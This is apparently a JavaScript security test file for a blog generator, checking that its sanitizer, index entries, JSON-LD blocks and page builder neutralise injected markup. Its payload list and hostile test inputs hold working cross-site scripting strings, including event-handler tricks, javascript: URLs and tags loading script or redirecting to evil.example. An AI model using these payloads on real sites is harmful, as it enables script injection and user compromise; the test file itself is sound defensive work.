/* Security tests for the blog generator's HTML output: the body sanitizer, the blog
   index entry, JSON-LD embedding and the index reconciler. Imports generate-post.mjs
   directly, which is safe now that main() only runs as the process entrypoint. No
   network, no files written. */
import fs from 'fs';
import path from 'path';
import { sanitizeContent, buildPostListItem, jsonLdScript, buildPostHtml, insertIndexEntries } from './generate-post.mjs';

let pass = 0, fail = 0;
const t = (name, got, want) => {
  const ok = JSON.stringify(got) === JSON.stringify(want);
  ok ? pass++ : fail++;
  if (!ok) console.log(`FAIL ${name}\n     got  ${JSON.stringify(got)}\n     want ${JSON.stringify(want)}`);
};

/* The property the sanitizer exists for: every "<" left in the output opens or closes
   an allowlisted tag with no attributes. Anything else is inert text. */
const ONLY_SAFE_TAGS = /^(?:[^<>]|<\/?(?:p|h2|h3|strong|em|blockquote|ul|ol|li)>)*$/;
const isInert = (html) => ONLY_SAFE_TAGS.test(html);

/* --- sanitizeContent: payloads the old regex blocklist let through --- */
const payloads = [
  '<svg/onload=alert(1)>',
  '<svg onload=alert(1)>',
  '<img src=x onerror=alert(1)>',
  '<img/src=x/onerror=alert(1)>',
  '<p onclick="alert(1)">oi</p>',
  '<p/onclick=alert(1)>oi</p>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="jav&#x61;script:alert(1)">x</a>',
  '<a href="java\tscript:alert(1)">x</a>',
  '<script>alert(1)</script>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
  '<iframe src="https://evil.example"></iframe>',
  '<style>@import "//evil.example/x.css";</style>',
  '<math><mtext><script>alert(1)</script></mtext></math>',
  '<details open ontoggle=alert(1)>x</details>',
  '<form action="https://evil.example"><input name=q></form>',
  '<p title="a>b" onmouseover=alert(1)>x</p>',
  '<!--><script>alert(1)</script>-->',
  '</article><script>alert(1)</script>',
  '<p>ok</p><base href="https://evil.example/">',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<object data="x"></object><embed src="x">',
  '<<p>script>alert(1)<</p>/script>',
];
for (const payload of payloads) {
  const out = sanitizeContent(payload);
  t(`inert: ${payload.slice(0, 48)}`, isInert(out), true);
  t(`no handler/script survives as markup: ${payload.slice(0, 40)}`, /<[^>]*(?:on\w+\s*=|script|href|src)/i.test(out), false);
}

/* --- sanitizeContent: what real posts use is preserved --- */
t('paragraphs kept', sanitizeContent('<p>Um.</p>\n<p>Dois.</p>'), '<p>Um.</p>\n<p>Dois.</p>');
t('headings, emphasis, quote kept', sanitizeContent('<h2>A</h2><h3>B</h3><p><strong>c</strong> <em>d</em></p><blockquote><p>e</p></blockquote>'),
  '<h2>A</h2><h3>B</h3><p><strong>c</strong> <em>d</em></p><blockquote><p>e</p></blockquote>');
t('lists kept', sanitizeContent('<ul><li>a</li></ul><ol><li>b</li></ol>'), '<ul><li>a</li></ul><ol><li>b</li></ol>');
t('attributes dropped, tag kept', sanitizeContent('<p class="lede" onclick="x()">oi</p>'), '<p>oi</p>');
t('uppercase tags normalised', sanitizeContent('<P>oi</P>'), '<p>oi</p>');
t('unknown tag dropped, text kept', sanitizeContent('<p>um <span>dois</span> três</p>'), '<p>um dois três</p>');
t('script block removed with its content', sanitizeContent('<p>a</p><script>alert(1)</script><p>b</p>'), '<p>a</p><p>b</p>');
t('existing entities preserved', sanitizeContent('<p>Tom &amp; Jerry &lt;3 caf&eacute; &#39;x&#39; &#x27;y&#x27;</p>'),
  '<p>Tom &amp; Jerry &lt;3 caf&eacute; &#39;x&#39; &#x27;y&#x27;</p>');
t('bare ampersand escaped', sanitizeContent('<p>P&D e R$ 5 & 6</p>'), '<p>P&amp;D e R$ 5 &amp; 6</p>');
t('stray angle brackets escaped', sanitizeContent('<p>5 < 7 e 9 > 3</p>'), '<p>5 &lt; 7 e 9 &gt; 3</p>');
t('non-string input does not throw', sanitizeContent(undefined), '');

/* --- regression: every published post body survives unchanged ---
   The one permitted difference is a bare "&" becoming "&amp;" (two posts wrote
   "M&A" and "Empresas & Grandes" unescaped). Same rendering, valid markup. */
const escapeBareAmp = (html) => html.replace(/&(?![a-z][a-z0-9]*;|#\d+;|#x[0-9a-f]+;)/gi, '&amp;');
const POSTS = path.join('blog', 'posts');
const posts = fs.readdirSync(POSTS).filter((f) => f.endsWith('.html'));
const changed = posts.filter((f) => {
  const html = fs.readFileSync(path.join(POSTS, f), 'utf8');
  const body = html.match(/<article class="post-body"[^>]*>([\s\S]*?)<\/article>/)?.[1];
  return body === undefined || sanitizeContent(body) !== escapeBareAmp(body);
});
t(`all ${posts.length} archive bodies round-trip`, changed.slice(0, 3), []);

/* --- blog index entry: title and excerpt are text, never markup --- */
const pillar = { id: 'cycling', label: 'Ciclismo' };
const item = buildPostListItem({
  title: 'Preto & "branco" <img src=x onerror=alert(1)>',
  excerpt: '</p><script>alert(1)</script> 5 < 7',
  pillar, date: new Date('2026-11-13T12:00:00Z'), filename: '2026-11-13-teste.html',
});
t('index: no injected element', /<img|<script/i.test(item), false);
t('index: title escaped', item.includes('Preto &amp; &quot;branco&quot; &lt;img src=x onerror=alert(1)&gt;'), true);
t('index: excerpt escaped', item.includes('&lt;/p&gt;&lt;script&gt;alert(1)&lt;/script&gt; 5 &lt; 7'), true);
t('index: attribute cannot be broken out of', buildPostListItem({
  title: 't', excerpt: 'e', date: new Date('2026-11-13T12:00:00Z'),
  pillar: { id: 'x" onmouseover="alert(1)', label: 'L' }, filename: 'a.html" onclick="alert(1)',
}).match(/on\w+="alert/g), null);
t('index: plain entry unchanged in shape', buildPostListItem({ title: 'Um título', excerpt: 'Um resumo.', pillar, date: new Date('2026-11-13T12:00:00Z'), filename: '2026-11-13-um-titulo.html' }),
`    <a href="posts/2026-11-13-um-titulo.html" class="post-item" data-pillar="cycling">
      <div class="post-meta">
        <time class="post-date" datetime="2026-11-13">13 de novembro de 2026</time>
        <div class="post-pillar">Ciclismo</div>
      </div>
      <div class="post-content">
        <div class="post-title">Um título</div>
        <p class="post-excerpt">Um resumo.</p>
        <span class="post-read">Ler post <span>→</span></span>
      </div>
    </a>`);

/* --- JSON-LD: a string value cannot close the <script> element --- */
const evil = { name: '</script><script>alert(1)</script>', note: '<!-- x -->', ok: 'Preto & "branco"' };
const ld = jsonLdScript(evil);
t('json-ld: no closing script tag', /<\/script/i.test(ld), false);
t('json-ld: no raw "<" at all', ld.includes('<'), false);
t('json-ld: still parses to the same data', JSON.parse(ld), evil);

/* --- the whole page: hostile model output adds no executable markup --- */
const page = (over = {}) => buildPostHtml({
  title: 'Título', seoTitle: 'Título curto', excerpt: 'Resumo do post com tamanho suficiente para a descrição.',
  pillar, date: new Date('2026-11-13T12:00:00Z'), readTime: 4, content: '<p>Corpo.</p>',
  filename: '2026-11-13-titulo.html', imageUrl: '', faq: [{ question: 'P?', answer: 'R.' }], related: [], ...over,
});
const count = (html, re) => (html.match(re) || []).length;
const clean = page();
const hostile = page({
  title: '</title><script>alert(1)</script>',
  excerpt: '"><script>alert(2)</script>',
  content: '<p>Corpo.</p><svg/onload=alert(3)><script>alert(4)</script>',
  faq: [{ question: '</script><script>alert(5)</script>', answer: '</script><img src=x onerror=alert(6)>' }],
});
t('page: same number of <script> elements as a clean post', count(hostile, /<script\b/gi), count(clean, /<script\b/gi));
t('page: same number of </script> closers as a clean post', count(hostile, /<\/script/gi), count(clean, /<\/script/gi));
t('page: no injected svg/img', /<svg|<img/i.test(hostile), false);
t('page: no event handler attribute', /<[^>]+\son\w+\s*=/i.test(hostile), false);

/* --- index reconciler: missing posts are inserted in date order, idempotently --- */
const entry = (f) => `    <a href="posts/${f}" class="post-item" data-pillar="cycling">\n      <div>x</div>\n    </a>`;
const indexHtml = `<div class="posts-list" id="postsList">\n${entry('2026-09-25-c.html')}\n${entry('2026-09-21-a.html')}\n  </div>\n<footer></footer>`;
const order = (html) => [...html.matchAll(/href="posts\/([^"]+)"/g)].map((m) => m[1]);
const mid = insertIndexEntries(indexHtml, [{ filename: '2026-09-23-b.html', html: entry('2026-09-23-b.html') }]);
t('reconcile: inserted between its neighbours', order(mid), ['2026-09-25-c.html', '2026-09-23-b.html', '2026-09-21-a.html']);
t('reconcile: list container still closes after the entries', mid.indexOf('</a>\n  </div>\n<footer>') > 0, true);
t('reconcile: newest goes first', order(insertIndexEntries(indexHtml, [{ filename: '2026-09-29-d.html', html: entry('2026-09-29-d.html') }]))[0], '2026-09-29-d.html');
t('reconcile: oldest goes last', order(insertIndexEntries(indexHtml, [{ filename: '2026-09-01-z.html', html: entry('2026-09-01-z.html') }])).pop(), '2026-09-01-z.html');
t('reconcile: already-listed post is not duplicated', insertIndexEntries(mid, [{ filename: '2026-09-23-b.html', html: entry('2026-09-23-b.html') }]), mid);
t('reconcile: several at once keep the order', order(insertIndexEntries(indexHtml, [
  { filename: '2026-09-01-z.html', html: entry('2026-09-01-z.html') },
  { filename: '2026-09-23-b.html', html: entry('2026-09-23-b.html') },
])), ['2026-09-25-c.html', '2026-09-23-b.html', '2026-09-21-a.html', '2026-09-01-z.html']);

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
